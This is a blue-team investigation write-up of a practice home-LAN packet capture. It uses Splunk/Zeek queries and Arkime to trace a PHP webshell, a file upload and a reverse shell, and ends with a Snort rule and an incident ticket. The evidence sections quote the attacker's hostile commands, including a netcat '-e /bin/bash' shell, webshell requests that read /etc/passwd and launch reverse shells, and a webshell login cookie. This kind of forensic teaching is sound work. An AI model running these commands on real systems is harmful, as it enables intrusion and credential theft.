---
title: Witty server — Splunk-first baselining to a PHP webshell (minishell.php), a file upload and a reverse shell inside a home LAN
tags:
  - blue-team
  - pcap
  - splunk
  - zeek
  - arkime
  - snort
  - webshell
  - reverse-shell
  - linux
  - ticket
---

# Witty server — PHP webshell, file upload and a reverse shell inside a home LAN { #wittyserver }

!!! abstract "Case summary"
    A 5-minute practice PCAP from a **home network** (192.168.1.0/24, no domain), worked **Splunk-first** with Arkime for packet content. It is **not a malware infection**: a Windows 10 PC (**192.168.1.102**) uses a PHP **webshell, `minishell.php`**, already sitting on a Kali Linux web server (**wittyserver, 192.168.1.100**, Apache on port **55555**). Through the webshell it uploads `cerber4.PNG` to `/tmp`, runs `cat /etc/passwd`, and starts a **PHP reverse shell**. The first two tries to 192.168.1.102:4444 fail; the third, to **192.168.1.101:4444**, works and gives a shell as **www-data** for 2 minutes. The page also shows why most internet connections look empty (one-direction capture), why an image on an external site is **not** C2, and why initial access cannot be seen.

| | |
|---|---|
| **Evidence** | Practice PCAP, 2017-01-20 09:53:28 – 09:58:40 UTC (about 5 min). Source not recorded |
| **Environment** | Closed network. Splunk with Zeek logs (`index=zeek`) and Arkime, **only this PCAP loaded** (no case field or tag needed). **No Wireshark.** |
| **Deliverables** | Analysis, one Snort rule, one short incident ticket (txt) |
| **Related pages** | [BEGUILESOFT — HawkEye over FTP](beguilesoft-hawkeye-ftp-exfil.md) (same baselining method) · [Playbook: web shell / server](../playbooks/webshell-server.md) · [SPL cheat sheet](../splunk/spl-cheatsheet.md) · [Zeek conn.log](../../network/zeek/conn-log.md) · [Arkime search syntax](../../network/arkime/search-syntax.md) |

!!! tip "How to read this page"
    Same order as the analysis: **baselining → odd signs → HTTP → connections and files → Arkime content → initial access → Snort → ticket**. New SPL commands and fields are explained where they first appear. The **Question** boxes are real questions from the session.

!!! warning "The indicators on this page are real"
    Domains and IPs come from a real capture. Prose and tables are defanged (`[.]`); code blocks keep values as typed. **Do not visit them.**

## Answers at a glance { #answers }

| Item | Answer | Status |
|---|---|---|
| Network | Home LAN 192.168.1.0/24, router 192.168.1.1, ISP DNS 75.75.75.75 / 75.75.76.76 (Comcast). No DHCP, no domain | Confirmed |
| Impacted host | **192.168.1.100 wittyserver**, Kali Linux, Apache/2.4.18 on port 55555, MAC `6c:0b:84:6a:1d:d8` | Confirmed |
| Webshell operator | **192.168.1.102**, Windows 10, Chrome 55, MAC `90:e6:ba:96:43:32` (ASUSTek), possible host name RY4WN-PC | Confirmed (host name inferred) |
| Reverse shell listener | **192.168.1.101**, port 4444 (also runs SSH on 22) | Confirmed |
| Webshell | `/minishell.php`, login cookie `user=ry4wn`, pass = MD5 of `password` | Confirmed |
| Actions | Upload `cerber4.PNG` (real PNG) to `/tmp`; `cat /etc/passwd`; reverse shell; `ls`, `id`, `cd /tmp`, `nc -nv 192.168.1.100 5555 -e /bin/bash` | Confirmed |
| Reverse shell | to .102:4444 → failed (S0); to **.101:4444 → success**, 120 s, as `www-data` | Confirmed |
| Root access | Not seen | Confirmed (in capture) |
| Initial access | Not in the capture — `minishell.php` was already on the server | Confirmed (absence) |

---

## Step 0 — Before the first query { #prep }

Only this PCAP was ingested, so the `pcap_case` filter used in other cases is **not needed**: `index=zeek` alone is this case. In Arkime no `tags ==` filter is needed either.

- **Time range = All time** (the data is from 2017).
- **Splunk time zone = UTC** so `strftime` prints UTC.

---

## Step 1 — Baselining { #baseline }

The same six queries as the [BEGUILESOFT case](beguilesoft-hawkeye-ftp-exfil.md#baseline), without `pcap_case`. Line-by-line explanations are there; only new parts are explained here.

### 1-1. Capture window and log types { #log-types }

```spl
index=zeek
| stats count AS events min(ts) AS first max(ts) AS last BY sourcetype
| eval first=strftime(first, "%Y-%m-%d %H:%M:%S"), last=strftime(last, "%Y-%m-%d %H:%M:%S")
| sort - events
```

```text
sourcetype          events  first                last
zeek:conn           192     2017-01-20 09:53:28  2017-01-20 09:58:40
zeek:weird          96      2017-01-20 09:53:32  2017-01-20 09:58:40
zeek:dns            43      2017-01-20 09:53:31  2017-01-20 09:58:40
zeek:http           42      2017-01-20 09:53:35  2017-01-20 09:58:35
zeek:files          32      2017-01-20 09:53:35  2017-01-20 09:58:35
zeek:ssl            5       2017-01-20 09:54:18  2017-01-20 09:58:40
zeek:packet_filter  1       2026-11-23 12:22:18  2026-11-23 12:22:18
```

- Capture: **09:53:28 – 09:58:40 UTC, about 5 minutes**.
- `zeek:packet_filter` carries the processing date (today), not a packet time — Zeek writes it when it starts. Ignore it.
- **`zeek:weird` has 96 events** — Zeek saw something odd. Checked in [Step 2](#weird).

### 1-2. DHCP and Kerberos { #dhcp-kerberos }

```spl
index=zeek sourcetype=zeek:dhcp
| eval time=strftime(ts, "%Y-%m-%d %H:%M:%S")
| table time client_addr assigned_addr mac host_name domain msg_types
```

```spl
index=zeek sourcetype=zeek:kerberos
| stats count BY id_orig_h id_resp_h client
```

- `client_addr` (added this time) = the IP the PC used when asking. Useful when `assigned_addr` is empty (DHCP INFORM).
- **Both return "No results found."** No DHCP in 5 minutes (addresses were already set) and **no Kerberos** = **no Windows domain**.

### 1-3. Internal hosts { #internal-hosts }

```spl
index=zeek sourcetype=zeek:conn
| where cidrmatch("10.0.0.0/8", id_orig_h) OR cidrmatch("172.16.0.0/12", id_orig_h) OR cidrmatch("192.168.0.0/16", id_orig_h)
| stats count AS conns dc(id_resp_h) AS dests BY id_orig_h
| sort - conns
```

```text
id_orig_h       conns  dests
192.168.1.102   184    51
192.168.1.100   8      2
```

- **192.168.1.102** starts almost everything (184 connections, 51 destinations): the main PC.
- **192.168.1.100** starts only 8, to 2 destinations. Keep it in mind — a server starting connections is checked later.

### 1-4. Destinations and DNS { #destinations }

```spl
index=zeek sourcetype=zeek:conn
| stats count AS conns sum(orig_bytes) AS sent sum(resp_bytes) AS recv min(ts) AS first BY id_resp_h id_resp_p service
| eval first=strftime(first, "%H:%M:%S")
| sort first
| where NOT cidrmatch("192.168.0.0/16", id_resp_h)
```

- **New: `where NOT cidrmatch(...)`.** `NOT` turns the condition around: keep only rows whose destination is **not** in 192.168.0.0/16 = external destinations only. Change the range to match the internal network.

53 rows; the interesting ones:

```text
id_resp_h        id_resp_p  service  conns  sent     recv  first
52.3.222.186     9339       -        1      2227     0     09:53:30
75.75.75.75      53         dns      11                    09:53:39
75.75.76.76      53         dns      3                     09:53:39
82.98.86.178     80         http     14     5543     0     09:53:39
255.255.255.255  17500      -        1      5852     0     09:53:41
74.125.192.125   5222       -        1      583      0     09:53:46
173.192.194.69   5938       -        1      144      0     09:54:08
94.31.29.54      80         -        1                     09:54:16
239.255.255.250  1900       -        4      2898     0     09:54:31
165.254.162.243  8253       -        1                     09:57:49
8.23.224.125     80         http     1      245      0     09:57:49
... dozens of Google / Microsoft / CDN 443 and 80 rows with recv 0 ...
```

```spl
index=zeek sourcetype=zeek:dns
| stats count values(answers) AS answers min(ts) AS first BY query
| eval first=strftime(first, "%H:%M:%S")
| sort first
```

```text
query                             count  answers  first
WPAD                              15     -        09:53:31
wpad                              12     -        09:53:31
www.ajithkp560.aaaaaaaa.com       4      -        09:53:39
code.jquery.com                   1      -        09:53:47
service.weather.microsoft.com     1      -        09:54:18
ry4wn-pc                          2      -        09:54:41
clients1.google.com               1      -        09:55:32
safebrowsing-cache.google.com     1      -        09:56:20
dynupdate.noip.com                1      -        09:57:49
ipcast1.dynupdate.noip.com        1      -        09:57:49
clients2.google.com               2      -        09:58:32
settings-win.data.microsoft.com   1      -        09:58:40
v10.vortex-win.data.microsoft.com 1      -        09:58:40
```

**Reading the baseline:**

- **Home network.** Internal 192.168.1.0/24, DNS servers **75.75.75.75 / 75.75.76.76 = Comcast** (a US home ISP). No DHCP and no Kerberos fit a home LAN without a domain — so there is no user account to find.
- **`ry4wn-pc`** is a host name candidate (a name asked on the LAN). Not confirmed yet.
- **Normal background:** 17500 = Dropbox LAN sync, 1900 = SSDP, 5355/WPAD = LLMNR/proxy discovery, 5222/5228 = Google push. Lots of Google/Microsoft 443.
- **Two odd signs:** almost every external connection has **recv 0**, and **every DNS answer is empty**.
- **Candidates worth a look:**
    - `www.ajithkp560.aaaaaaaa[.]com` at 09:53:39 — 14 HTTP connections to 82.98.86.178 start in the same second.
    - `dynupdate.noip[.]com` at 09:57:49 → 8.23.224.125 HTTP. No-IP is **dynamic DNS**; RATs such as njRAT often use it to update their address. 165.254.162.243:**8253** at the same second.
    - 52.3.222.186:**9339** at 09:53:30 — an unusual port.
    - 173.192.194.69:**5938** — **TeamViewer**'s port. Could be legitimate; check.

---

## Step 2 — Why are the answers empty? The weird log { #weird }

```spl
index=zeek sourcetype=zeek:weird
| stats count BY name
| sort - count
```

`zeek:weird` records traffic that breaks protocol rules. `name` is the type of oddity.

```text
name                     count
possible_split_routing   41
data_before_established  40
inappropriate_FIN        15
```

- **`possible_split_routing`** and **`data_before_established`** mean Zeek saw **only one direction** of many connections (for example data without the handshake). **`inappropriate_FIN`** has the same cause.
- In the HTTP log ([Step 3](#http)) the connections to 192.168.1.100 **do have replies** (status 200, `text/html`). So: **LAN traffic was captured in both directions, internet traffic only outbound.** That explains `recv 0` and the empty DNS answers. It is a capture-point property, not malicious behaviour.

!!! note "Why it matters"
    Without this check, "sent 5,543, received 0" to 82.98.86.178 could be misread as exfiltration. Always ask whether the capture saw both directions before reading bytes.

---

## Step 3 — HTTP: a webshell { #http }

```spl
index=zeek sourcetype=zeek:http
| sort ts
| eval time=strftime(ts, "%H:%M:%S")
| table time id_resp_h method host uri status_code user_agent referrer resp_mime_types
```

- **`sort ts` comes before `eval`** so rows are in time order first.
- `method` GET/POST · `host` the HTTP Host · `uri` the path · `status_code` 200/302/404… · `user_agent` the program that asked (browser or malware) · `referrer` the page it came from · `resp_mime_types` the type Zeek found in the reply content. When the reply was not captured, `status_code` and `resp_mime_types` are empty.

Result (42 rows, shortened; every browser request has the same Chrome 55 / Windows 10 User-Agent):

```text
time      id_resp_h      method     uri                                                          status  referrer                                         mime
09:53:35  192.168.1.100  GET        /                                                            200     -                                                text/html
09:53:35  192.168.1.100  GET        /icons/blank.gif  (+ unknown, compressed, hand.right, folder, text, tar .gif)  200  http://192.168.1.100:55555/  image/gif
09:53:35  192.168.1.100  GET        /favicon.ico                                                 404     http://192.168.1.100:55555/                     text/html
09:53:39  192.168.1.100  GET        /minishell.php                                               200     http://192.168.1.100:55555/                     text/plain
09:53:39  82.98.86.178   GET        /images/background.gif                                       -       http://192.168.1.100:55555/minishell.php        -
09:53:47  192.168.1.100  POST       /minishell.php                                               200     .../minishell.php                               text/plain
09:53:47  94.31.29.54    GET        /jquery-latest.js                                            -       .../minishell.php                               -
09:54:16  192.168.1.100  POST       /minishell.php                                               200     .../minishell.php                               text/plain
09:54:18  192.168.1.100  GET        /minishell.php?                                              200     .../minishell.php                               text/plain
09:54:29  192.168.1.100  GET        /minishell.php?path=/var/www/html                            200     .../minishell.php?                              text/plain
09:54:38  192.168.1.100  GET        /minishell.php?path=/tmp                                     200     .../minishell.php?path=%2Fvar%2Fwww%2Fhtml
09:54:47  192.168.1.100  POST       /minishell.php?path=/tmp                                     200     .../minishell.php?path=%2Ftmp
09:54:49  192.168.1.100  GET        /minishell.php?                                              200     .../minishell.php?path=%2Ftmp
09:55:04  192.168.1.100  GET        /minishell.php?path=/var/www/html&cmdexe=cat+/etc/passwd     200     .../minishell.php?
09:55:21  192.168.1.100  GET        /minishell.php?path=/var/www/html&forbd_dir                  200     ...&cmdexe=cat+%2Fetc%2Fpasswd
09:55:23  192.168.1.100  GET        /minishell.php?                                              200     ...&forbd_dir
09:55:28  192.168.1.100  GET        /minishell.php?cookiejack                                    200     .../minishell.php?
09:55:32  192.168.1.100  GET        /minishell.php?rs                                            200     .../minishell.php?cookiejack
09:55:32  192.168.1.1    SUBSCRIBE  /upnp/event/WANCommonIFC1   (UA Microsoft-Windows/10.0 UPnP/1.0)   -
09:56:05  192.168.1.100  GET        /minishell.php?rev_option=PHP+Reverse+Shell&my_ip=192.168.1.102&my_port=4444   200   .../minishell.php?rs
09:56:27  192.168.1.100  GET        /minishell.php?rev_option=PHP+Reverse+Shell&my_ip=192.168.1.102&my_port=4444   200   .../minishell.php?rs
09:56:35  192.168.1.100  GET        /minishell.php?rev_option=PHP+Reverse+Shell&my_ip=192.168.1.101&my_port=4444   200   .../minishell.php?rs
09:57:49  8.23.224.125   GET        /settings.php?username=...&pass=HMAC{...}   (UA DUC v4.1.1/6.2.9200.0/en-US/Service)   -
09:58:35  82.98.86.178   GET        /images/background.gif                                       -       ...&my_ip=192.168.1.101&my_port=4444
```

(After every webshell page there is one more `GET /images/background.gif` to 82.98.86.178; most are left out above.)

**Reading the result:**

192.168.1.102 (Windows 10, Chrome 55) is driving a **PHP webshell** on 192.168.1.100:**55555**. A webshell is a PHP file secretly placed on a web server so the server can be controlled from a browser. Paths like `/var/www/html` and `/etc/passwd` show .100 is a **Linux** web server. In URLs, `%2F` = `/` and `+` = a space.

```text
09:53:35  GET /                       ← directory listing (icons/*.gif = Apache's default listing)
09:53:39  GET /minishell.php          ← open the webshell
09:53:47  POST /minishell.php         ← probably the webshell login
09:54:29  ?path=/var/www/html         ← browse the web folder
09:54:38  ?path=/tmp                  ← look at /tmp
09:54:47  POST ?path=/tmp             ← possibly a file upload to /tmp ★
09:55:04  ?cmdexe=cat /etc/passwd     ← run a command on the server (read the account list) ★
09:55:21  ?forbd_dir                  ← webshell menu
09:55:28  ?cookiejack                 ← cookie-theft menu
09:55:32  ?rs                         ← reverse shell menu
09:56:05  rev_option=PHP Reverse Shell&my_ip=192.168.1.102&my_port=4444  ★
09:56:27  (same request again)
09:56:35  rev_option=PHP Reverse Shell&my_ip=192.168.1.101&my_port=4444  ★
```

The last three lines matter most. A **reverse shell** makes the server (.100) **connect out** to the attacker (.102 or .101) on port 4444. If it works, the attacker gets a real command shell instead of a web page. Two tries to .102, then the target changes to **192.168.1.101**, a LAN host that hardly appears elsewhere.

**82.98.86.178 is not C2.** Every webshell page loads `/images/background.gif` from 82.98.86.178 (`www.ajithkp560.aaaaaaaa[.]com`) and `jquery-latest.js` from 94.31.29.54 (`code.jquery[.]com`). The Referer is always `minishell.php`: these are **resources embedded in the webshell page** — the background image comes from the webshell author's site. No commands travel there. In the ticket it is "an external resource loaded by the webshell page" — still a good detection clue.

**Other notes:**

- 09:57:49 GET to `dynupdate.noip[.]com` with User-Agent `DUC v4.1.1 ... Service`: the **No-IP Dynamic Update Client** is installed as a service on .102. It keeps a domain name pointing at a changing home IP — legitimate software, but also used by attackers to host listeners. Together with 173.192.194.69:5938 (TeamViewer) at 09:54:08, worth asking whether someone was remote-controlling .102. Neither is linked to the webshell activity by evidence.
- The `host` column shows **"workstation"** for every row. Here that is Splunk's host value, not the HTTP Host header — take domain names from DNS or Arkime.

!!! question "Question: where did `cmd.exe` come from?"
    It is not `cmd.exe` — it is **`cmdexe`**, with no dot. It has nothing to do with the Windows command prompt.

    It is in the URI of the 09:55:04 request:

    ```text
    GET /minishell.php?path=/var/www/html&cmdexe=cat+/etc/passwd
    ```

    After `?` comes the **query string**: `name=value` pairs joined by `&`. This request has two:

    - `path=/var/www/html` → the folder the webshell should show
    - `cmdexe=cat+/etc/passwd` → the command to run on the server (`+` is a space, so `cat /etc/passwd`)

    **`cmdexe` is a variable name chosen by whoever wrote `minishell.php`** — short for "command execute". The webshell page has a command box; when the attacker types `cat /etc/passwd` there, the browser sends it as `cmdexe=`. The PHP code takes that value and runs it in the Linux shell.

    Arkime shows it too: in the 09:55:04 session's HTTP panel, **QS Keys: `path` `cmdexe`**. QS (Query String) Keys lists the variable names found in the URL.

    And this server is not Windows: the reply header is `Server: Apache/2.4.18 (Debian)` and the reverse shell prints `Linux wittyserver 4.3.0-kali1-amd64`. So `cmd.exe` cannot exist there. The commands run are Linux commands: `cat`, `ls`, `id`.

---

## Step 4 — Did the reverse shell work? What was uploaded? { #connections }

### 4-1. Port 4444 (reverse shell) and 5938 (TeamViewer) { #port-4444 }

```spl
index=zeek sourcetype=zeek:conn (id_resp_p=4444 OR id_resp_p=5938)
| sort ts
| eval time=strftime(ts, "%H:%M:%S")
| table time id_orig_h id_orig_p id_resp_h id_resp_p conn_state orig_bytes resp_bytes duration
```

- `OR` inside the brackets: either port matches.
- **New field `conn_state`** — the result of the connection, in short codes:
    - **SF** — opened and closed normally (the connection worked)
    - **S0** — SYN sent, **no answer**
    - **REJ** — refused (RST back)
    - **OTH** — seen from the middle; no handshake, so Zeek cannot judge
- `duration` — how many seconds the connection lasted.

```text
time      id_orig_h      id_orig_p  id_resp_h        id_resp_p  conn_state  orig_bytes  resp_bytes  duration
09:54:08  192.168.1.102  49729      173.192.194.69   5938       OTH         144         0           275.170322
09:56:05  192.168.1.100  39336      192.168.1.102    4444       S0          0           0           3.002945
09:56:12  192.168.1.100  39336      192.168.1.102    4444       S0
09:56:20  192.168.1.100  39336      192.168.1.102    4444       S0
09:56:27  192.168.1.100  39338      192.168.1.102    4444       S0          0           0           3.001502
09:56:34  192.168.1.100  39338      192.168.1.102    4444       S0
09:56:35  192.168.1.100  57978      192.168.1.101    4444       SF          4336        77          120.691404
09:56:42  192.168.1.100  39338      192.168.1.102    4444       S0
```

**Reading the result:**

- **To .102:4444 — six S0.** The server sent SYN and .102 never answered. Only two source ports (39336, 39338) appear because these are **retransmissions** of the same two attempts, a few seconds apart. No listener on .102, or the Windows firewall dropped it.
- **To .101:4444 at 09:56:35 — SF**, in the **same second** as the HTTP request with `my_ip=192.168.1.101`. It opened and closed normally and lasted **120 seconds**. .100 sent 4,336 B, .101 sent 77 B. In a reverse shell the attacker types short commands (77 B) and the server sends back long output (4,336 B) — exactly this shape. **The attacker held a shell on the web server for 2 minutes.**
- TeamViewer: OTH with 0 received — the one-direction capture again. Content unknown and no link to the webshell.

### 4-2. Everything 192.168.1.100 started { #server-outbound }

```spl
index=zeek sourcetype=zeek:conn id_orig_h=192.168.1.100
| sort ts
| eval time=strftime(ts, "%H:%M:%S")
| table time id_resp_h id_resp_p service conn_state orig_bytes resp_bytes
```

- Writing `field=value` (`id_orig_h=192.168.1.100`) in the search keeps only events with that value.

```text
time      id_resp_h      id_resp_p  service  conn_state  orig_bytes  resp_bytes
09:56:00  192.168.1.101  22         -        OTH         3160        8416
09:56:05  192.168.1.102  4444       -        S0          0           0
...       (the 4444 rows above)
09:56:35  192.168.1.101  4444       -        SF          4336        77
```

The 8 connections are the 7 reverse shell rows plus **one SSH connection between .100 and .101:22** (3,160 / 8,416 B, **OTH**). OTH means Zeek missed the start (3-way handshake). The capture started at 09:53:28, so this SSH session was **already open before the capture** and first sent packets at 09:56:00. When Zeek cannot see the start it treats the port-22 side as the server, so **.101 runs an SSH server** — .101 looks like a Linux machine (possibly the attacker's). Who opened the session is unknown, and the content is encrypted.

### 4-3. Files the server received { #files }

```spl
index=zeek sourcetype=zeek:files rx_hosts=192.168.1.100
| sort ts
| eval time=strftime(ts, "%H:%M:%S")
| table time tx_hosts rx_hosts mime_type filename seen_bytes md5
```

- `tx_hosts` = sender, `rx_hosts` = receiver. `rx_hosts=192.168.1.100` keeps only what the **server received**.
- `mime_type` = the type Zeek found by looking at the content (`application/x-dosexec` would be a Windows program); `seen_bytes` = bytes actually seen.

```text
time      tx_hosts       rx_hosts       mime_type   filename     seen_bytes  md5
09:53:47  192.168.1.102  192.168.1.100  text/plain  -            49          -
09:54:16  192.168.1.102  192.168.1.100  image/png   cerber4.PNG  23125       -
09:54:16  192.168.1.102  192.168.1.100  text/plain  -            13          -
09:54:16  192.168.1.102  192.168.1.100  -           -            8           -
09:54:47  192.168.1.102  192.168.1.100  -           -            4           -
09:54:47  192.168.1.102  192.168.1.100  image/png   cerber4.PNG  23125       -
09:54:47  192.168.1.102  192.168.1.100  -           -            8           -
```

**Reading the result:**

- **`cerber4.PNG` (23,125 B) was uploaded twice**: 09:54:16 (POST `minishell.php`) and 09:54:47 (POST `?path=/tmp`). **Cerber** is a ransomware family, so the name is worrying. Zeek decided `image/png` from the file's magic bytes, so it is most likely a real picture — perhaps a ransom-note image.
- `md5` is empty because file hashing was not enabled in this Zeek setup.
- The small "files" (49, 13, 8, 4 B) are **POST form fields**, not files. The 49 B at 09:53:47 is probably the webshell login.

**Story so far:**

```text
09:53:39  .102 → .100:55555  open webshell minishell.php, log in
09:54:16  .102 → .100        upload cerber4.PNG (1)
09:54:47  .102 → .100        upload cerber4.PNG → /tmp (2)
09:55:04  .102 → .100        run command: cat /etc/passwd
09:56:05  .100 → .102:4444   reverse shell → failed (S0)
09:56:35  .100 → .101:4444   reverse shell → success (SF, 120 s)
```

---

## Step 5 — Arkime for the content { #arkime }

The reverse shell and the webshell are unencrypted, so commands and output are readable.

```text
ip.src == 192.168.1.100 && ip.dst == 192.168.1.101 && port.dst == 4444
ip.dst == 192.168.1.100 && http.method == POST
ip.dst == 192.168.1.100 && http.uri == *cmdexe*
```

- `http.uri == *cmdexe*` — `*` on both sides finds sessions with `cmdexe` **anywhere** in the URI.

### 5-1. The reverse shell (.100:57978 → .101:4444) { #reverse-shell }

In the packet view, **Source (.100)** is the server's output and **Destination (.101)** is what the attacker typed.

**What the server sent by itself on connect** (a PHP reverse shell script sends `uname -a`, `w` and `id` straight away):

```text
Linux wittyserver 4.3.0-kali1-amd64 #1 SMP Debian 4.3.3-5kali4 (2016-01-13) x86_64 GNU/Linux
 04:56:35 up 35 days, 6:27, 1 user, load average: 0.18, 0.12, 0.14
USER  TTY   FROM  LOGIN@   IDLE    JCPU   PCPU  WHAT
root  tty2  :0    15Dec16  35days  43:00m 2.15s eog /root/Pictures/13124439_..._n.jpg
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

- Host name **wittyserver**, **Kali Linux** kernel.
- Up 35 days; **root is logged in on the console** (tty2) with an image viewer (eog) open.
- The shell runs as **www-data** (uid 33), the web server account — **not root**.
- `can't access tty; job control turned off` is the usual message of a simple reverse shell (no full terminal).

**What the attacker typed (77 B):**

```text
cat /etc/passwd                      ← read the account list again
ls                                   ← list /
id                                   ← check privileges (www-data)
cd /tmp
ls                                   ← cerber4.PNG is there → upload confirmed
nc -nv 192.168.1.100 5555 -e /bin/bash
exit
```

**Reading the output:**

- `/etc/passwd` shows normal users **ry4wn** (uid 1000), **wordpress** (1001), **backups** (1002), and service accounts such as mysql, postgres, couchdb and redis — what an attacker reads to choose the next target (password guessing, privilege escalation).
- `ls /tmp` lists **cerber4.PNG**: the upload is confirmed on disk.
- `nc -nv 192.168.1.100 5555 -e /bin/bash` connects netcat to 192.168.1.100:5555 and attaches bash to it. The target is **the server itself**. The reply `(UNKNOWN) [192.168.1.100] 5555 (?) open` shows something was listening on 5555. Traffic from a host to itself does not leave it, so it is not in the capture. A typo, or a link to another backdoor? **Host check required.**

### 5-2. The cerber4.PNG upload (.102:56133 → .100:55555) { #upload }

```text
POST /minishell.php?path=%2Ftmp HTTP/1.1
Host: 192.168.1.100:55555
Content-Length: 23511
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWlmDBITBvT55SBwa
Referer: http://192.168.1.100:55555/minishell.php?path=%2Ftmp
Cookie: user=ry4wn; pass=5f4dcc3b5aa765d61d8327deb882cf99

------WebKitFormBoundaryWlmDBITBvT55SBwa
Content-Disposition: form-data; name="path"

/tmp
------WebKitFormBoundaryWlmDBITBvT55SBwa
Content-Disposition: form-data; name="upload_f"; filename="cerber4.PNG"
Content-Type: image/png

‰PNG
IHDR ... sRGB ... gAMA ... pHYs ... IDAT ...
```

- `multipart/form-data` is how a web page's "upload file" button sends a file.
- `name="path"` → `/tmp` = the target folder; `name="upload_f"; filename="cerber4.PNG"` = the webshell's upload field and the file name.
- The body starts `‰PNG` → `IHDR`, `sRGB`, `gAMA`, `pHYs`, `IDAT`: the structure of a **real PNG image**, not a renamed program. What the picture shows needs file extraction.

**The cookie matters:** `user=ry4wn; pass=5f4dcc3b5aa765d61d8327deb882cf99` is the webshell login. `5f4dcc3b5aa765d61d8327deb882cf99` is a very well-known MD5 hash — of **`password`**. So the webshell login is `ry4wn` / `password`. ry4wn is also a user on the server and matches the `ry4wn-pc` name in DNS — .102's host name is likely RY4WN-PC (not confirmed).

### 5-3. The `cmdexe=cat /etc/passwd` request (09:55:04) { #cmdexe }

The reply has `Content-Encoding: gzip`, so Arkime shows compressed bytes (`libfile content type: application/x-gzip`). The same `/etc/passwd` content was readable in the reverse shell, so there is no need to unzip it: this request already proves **command execution through the webshell**.

**Extras visible in the session panel:**

- MACs: .102 = **90:e6:ba:96:43:32** (ASUSTek), .100 = **6c:0b:84:6a:1d:d8**.
- **IP TTL** .102 = 128, .100 = 64. Initial TTL is 128 on Windows and 64 on Linux — a Windows client attacking a Linux server.

---

## Step 6 — Can initial access be seen? { #initial-access }

!!! question "Question: is initial access not visible?"
    No — not in this capture. Initial access here means **how `minishell.php` got onto the server**. Three reasons:

    **1. The webshell was there before the capture.** The first request from .102 to .100:55555 is `GET /` at 09:53:35, followed by `/icons/blank.gif`, `folder.gif`, `unknown.gif`, `text.gif`, `tar.gif` — the icons of an **Apache directory listing** (shown when a folder has no index.html). Four seconds later `GET /minishell.php` has Referer `http://192.168.1.100:55555/`: it was **clicked in the listing**. The file already existed.

    **2. No upload of `minishell.php`.** The files the server received are `cerber4.PNG` and small form fields only. No PUT/POST, FTP or SCP carrying the webshell.

    **3. A lead: the .100 ↔ .101 SSH session** was already open before the capture (OTH). It could be how the webshell was placed, but it is encrypted, so it stays a possibility in the ticket.

Confirm that nothing reached .100 before the listing:

```spl
index=zeek sourcetype=zeek:http id_resp_h=192.168.1.100
| stats min(ts) AS first count BY method uri
| eval first=strftime(first, "%H:%M:%S")
| sort first
| head 5
```

- `stats ... BY method uri` — the first time and count for each method + path.
- **New: `head 5`** shows only the **top 5 rows** — after sorting, the 5 earliest requests.

```text
method  uri                    first     count
GET     /                      09:53:35  1
GET     /favicon.ico           09:53:35  1
GET     /icons/blank.gif       09:53:35  1
GET     /icons/compressed.gif  09:53:35  1
GET     /icons/folder.gif      09:53:35  1
```

The first request is `GET /` with no upload before it: the webshell **was already on the server**.

!!! question "Question: Wireshark must not be used — how else can the listing's file dates be read?"
    An Apache directory listing shows **Last modified** for each file, which would date when `minishell.php` appeared. The reply is gzip-compressed, so it needs unzipping. With **Arkime + CyberChef** only:

    1. Arkime: `ip.src == 192.168.1.102 && ip.dst == 192.168.1.100 && port.dst == 55555 && http.method == GET`, open the 09:53:35 session whose URI is `/`.
    2. **Packet Options → Show Images & Files** — a download link for the reply body should appear on the Destination side (body only, no headers).
    3. CyberChef: drop the file into **Input**, recipe **Gunzip** (add **Render HTML** to see it as a table), and read the date next to `minishell.php`.

    **If no link appears:** download **Destination Raw** (headers + body), CyberChef **Extract Files** (tick GZIP) to cut out the gzip part (it searches for the `1f 8b` start marker), save it, then **Gunzip**.

    In this case the download did not work, so the ticket says "Initial access not in capture" without a date.

---

## Step 7 — One Snort rule { #snort }

```text
alert tcp $HOME_NET any -> $HOME_NET 55555 (msg:"minishell.php webshell access - Sung"; content:"minishell.php"; nocase; sid:1000031; rev:1;)
```

- The traffic is **inside the LAN**, so the destination is `$HOME_NET`, not `$EXTERNAL_NET`.
- `$HOME_NET 55555` — to an internal host on port 55555 (the web server).
- `content:"minishell.php"` + `nocase` — any request containing the webshell's name, in any case.
- `sid:1000031; rev:1;` — own rule number and version.

Expect roughly **one alert per webshell request** (16 in the HTTP list); replies come **from** port 55555 and are not matched. Testing steps: [Night Dew, second pass — 6-3](night-dew-arkime-splunk-netlogon-bruteforce.md#snort-test).

---

## Timeline (2017-01-20, UTC) { #timeline }

| Time | Event |
|---|---|
| 09:53:28 | Capture starts (SSH session .100 ↔ .101:22 already open) |
| 09:53:35 | .102 → .100:55555 `GET /` — Apache directory listing |
| 09:53:39 | `GET /minishell.php` from the listing; page loads `background.gif` from 82.98.86.178 |
| 09:53:47 | POST `minishell.php` — webshell login (`ry4wn`) |
| 09:54:16 / 09:54:47 | `cerber4.PNG` uploaded (second time to `/tmp`) |
| 09:55:04 | `cmdexe=cat /etc/passwd` — command run through the webshell |
| 09:55:21–09:55:32 | Webshell menus: `forbd_dir`, `cookiejack`, `rs` |
| 09:56:05–09:56:42 | Reverse shell .100 → .102:4444 — no answer (S0) |
| 09:56:35–09:58:36 | Reverse shell .100 → **.101:4444** — success, `www-data`, 120 s |
| 09:57:49 | .102 No-IP DUC update (`dynupdate.noip[.]com`) — not linked by evidence |
| 09:58:40 | Capture ends |

## IOCs { #iocs }

| Type | Value | Note |
|---|---|---|
| URL path | `/minishell.php` on 192.168.1.100:55555 | PHP webshell |
| Query keys | `cmdexe=`, `rev_option=PHP+Reverse+Shell&my_ip=&my_port=`, `cookiejack`, `forbd_dir`, `rs` | minishell features |
| Cookie | `user=ry4wn; pass=5f4dcc3b5aa765d61d8327deb882cf99` | Webshell login (MD5 of `password`) |
| Domain / IP | `www.ajithkp560.aaaaaaaa[.]com` / 82.98.86.178 | Background image of the webshell page |
| File | `/tmp/cerber4.PNG` (23,125 B, PNG) | Uploaded through the webshell |
| Port | 4444/tcp from the server to the LAN | Reverse shell |

---

## Incident ticket { #ticket }

The impacted machine is the **web server .100**; .102 and .101 are **lateral sources** (internal attack sources). Key findings only, simple English.

[:material-download: Download the ticket as a txt file](files/170120_wittyserver_ticket.txt){ .md-button }

```text
--8<-- "docs/blueteam/investigations/files/170120_wittyserver_ticket.txt"
```

How the fields were chosen:

- **IMPACTED INTERNAL MACHINES** — wittyserver (192.168.1.100).
- **LATERAL** — .102 (webshell operator) and .101 (reverse shell listener), with ports 55555 and 4444.
